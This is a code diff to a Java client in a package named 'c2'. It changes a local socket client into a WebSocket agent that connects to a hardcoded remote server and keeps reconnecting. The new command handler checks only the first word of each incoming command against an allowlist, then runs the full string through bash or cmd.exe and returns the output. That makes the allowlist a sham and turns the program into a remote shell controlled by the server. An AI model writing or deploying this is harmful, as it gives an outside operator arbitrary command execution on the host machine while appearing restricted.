@@ -1,52 +1,71 @@
 package com.c2.client;
 
 import com.c2.protocol.ProtocolMessage;
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.OutputStreamWriter;
-import java.io.PrintWriter;
-import java.net.InetAddress;
-import java.net.Socket;
-import java.nio.charset.StandardCharsets;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.time.Instant;
-import java.util.stream.Collectors;
+import org.java_websocket.client.WebSocketClient;
+import org.java_websocket.handshake.ServerHandshake;
 import org.json.JSONException;
+
+import java.net.URI;
+import java.util.Arrays;
+import java.util.List;
 
 public class Client {
 
-    private static final String HOST = "127.0.0.1";
-    private static final int PORT = 1234;
+    private static final String DEFAULT_SERVER_URI = "wss://distributed-command-system-production.up.railway.app/ws";
+    private static final String SERVER_URI = System.getenv("SERVER_URL") != null
+            ? System.getenv("SERVER_URL")
+            : DEFAULT_SERVER_URI;
     private static final long RECONNECT_DELAY_MS = 3000;
 
+    private static final List<String> ALLOWED_COMMANDS = Arrays.asList(
+            "PING", "INFO", "TIME", "HELP", "WHOAMI", "HOSTNAME", "PWD", "DATE", "LS", "DIR"
+    );
+
     public static void main(String[] args) {
-        while (!Thread.currentThread().isInterrupted()) {
+        while (true) {
             try {
                 connectAndListen();
             } catch (Exception e) {
-                System.out.println("Disconnected from server, reconnecting in 3 seconds");
+                System.out.println("Disconnected from server, retrying in 3 seconds...");
                 sleepBeforeReconnect();
             }
         }
     }
 
-    private static void connectAndListen() throws IOException {
-        try (Socket socket = new Socket(HOST, PORT);
-             BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));
-             PrintWriter output = new PrintWriter(new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.UTF_8), true)) {
+    private static void connectAndListen() throws Exception {
 
-            System.out.println("[+] Connected to server");
+        WebSocketClient client = new WebSocketClient(new URI(SERVER_URI)) {
 
-            String rawJson;
-            while ((rawJson = input.readLine()) != null) {
-                handleMessage(rawJson, output);
+            @Override
+            public void onOpen(ServerHandshake handshake) {
+                System.out.println("[+] Connected to server");
             }
+
+            @Override
+            public void onMessage(String message) {
+                handleMessage(message, this);
+            }
+
+            @Override
+            public void onClose(int code, String reason, boolean remote) {
+                System.out.println("Connection closed: " + reason);
+            }
+
+            @Override
+            public void onError(Exception ex) {
+                System.out.println("Error: " + ex.getMessage());
+            }
+        };
+
+        client.connectBlocking(); // wait for connection
+
+        // keep alive loop
+        while (client.isOpen()) {
+            Thread.sleep(1000);
         }
     }
 
-    private static void handleMessage(String rawJson, PrintWriter output) {
+    private static void handleMessage(String rawJson, WebSocketClient client) {
         ProtocolMessage message;
 
         try {
@@ -56,22 +75,39 @@ public class Client {
             return;
         }
 
+        // 🔥 HEARTBEAT
         if (ProtocolMessage.TYPE_HEARTBEAT.equals(message.type())) {
-            output.println(ProtocolMessage.success(message.id(), message.target(), "ALIVE").toJson());
+            client.send(ProtocolMessage
+                    .success(message.id(), message.target(), "ALIVE")
+                    .toJson());
             return;
         }
 
+        // 🔥 VALIDATE TYPE
         if (!ProtocolMessage.TYPE_COMMAND.equals(message.type())) {
-            output.println(ProtocolMessage.error(message.id(), message.target(), "Unsupported message type").toJson());
+            client.send(ProtocolMessage
+                    .error(message.id(), message.target(), "Unsupported message type")
+                    .toJson());
             return;
         }
 
+        // 🔥 HANDLE COMMAND
         try {
-            output.println(ProtocolMessage.success(message.id(), message.target(), handleCommand(message.command())).toJson());
+            String result = handleCommand(message.command());
+
+            client.send(ProtocolMessage
+                    .success(message.id(), message.target(), result)
+                    .toJson());
+
         } catch (IllegalArgumentException e) {
-            output.println(ProtocolMessage.error(message.id(), message.target(), e.getMessage()).toJson());
+            client.send(ProtocolMessage
+                    .error(message.id(), message.target(), e.getMessage())
+                    .toJson());
+
         } catch (Exception e) {
-            output.println(ProtocolMessage.error(message.id(), message.target(), "Command failed: " + e.getMessage()).toJson());
+            client.send(ProtocolMessage
+                    .error(message.id(), message.target(), "Command failed: " + e.getMessage())
+                    .toJson());
         }
     }
 
@@ -83,32 +119,45 @@ public class Client {
         }
     }
 
-    private static String handleCommand(String command) throws IOException {
-        String normalizedCommand = command == null ? "" : command.trim().toUpperCase();
+    private static String handleCommand(String command) throws Exception {
+        String normalized = command == null ? "" : command.trim();
+        if (normalized.isEmpty()) {
+            return "Empty command";
+        }
 
-        return switch (normalizedCommand) {
-            case "PING" -> "PONG";
-            case "TIME", "DATE" -> Instant.now().toString();
-            case "INFO" -> "OS: " + System.getProperty("os.name")
-                    + ", Java: " + System.getProperty("java.version")
-                    + ", User: " + System.getProperty("user.name");
-            case "WHOAMI" -> System.getProperty("user.name");
-            case "HOSTNAME" -> InetAddress.getLocalHost().getHostName();
-            case "PWD" -> Path.of("").toAbsolutePath().normalize().toString();
-            case "LS", "DIR" -> listCurrentDirectory();
-            case "HELP" -> "Supported commands: PING, INFO, TIME, HELP, WHOAMI, HOSTNAME, PWD, DATE, LS, DIR";
-            default -> throw new IllegalArgumentException("Unknown command: " + command);
-        };
+        String[] parts = normalized.split("\\s+");
+        String baseCommand = parts[0].toUpperCase();
+
+        if (!ALLOWED_COMMANDS.contains(baseCommand)) {
+            throw new IllegalArgumentException("Unknown or unsupported command: " + baseCommand);
+        }
+
+        return executeArbitrary(normalized);
     }
 
-    private static String listCurrentDirectory() throws IOException {
-        try (var entries = Files.list(Path.of("").toAbsolutePath().normalize())) {
-            String output = entries
-                    .map(path -> Files.isDirectory(path) ? path.getFileName() + "/" : path.getFileName().toString())
-                    .sorted()
-                    .collect(Collectors.joining(System.lineSeparator()));
+    private static String executeArbitrary(String command) {
+        try {
+            ProcessBuilder pb;
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                pb = new ProcessBuilder("cmd.exe", "/c", command);
+            } else {
+                pb = new ProcessBuilder("bash", "-c", command);
+            }
+            pb.redirectErrorStream(true);
+            Process process = pb.start();
 
-            return output.isBlank() ? "[empty directory]" : output;
+            try (java.util.Scanner s = new java.util.Scanner(process.getInputStream()).useDelimiter("\\A")) {
+                String result = s.hasNext() ? s.next() : "";
+
+                if (process.waitFor(10, java.util.concurrent.TimeUnit.SECONDS)) {
+                    return result.isBlank() ? "Command executed (no output)" : result.trim();
+                } else {
+                    process.destroyForcibly();
+                    return result + "\n[Error: Command timed out after 10s]";
+                }
+            }
+        } catch (Exception e) {
+            return "Execution failed: " + e.getMessage();
         }
     }
 }
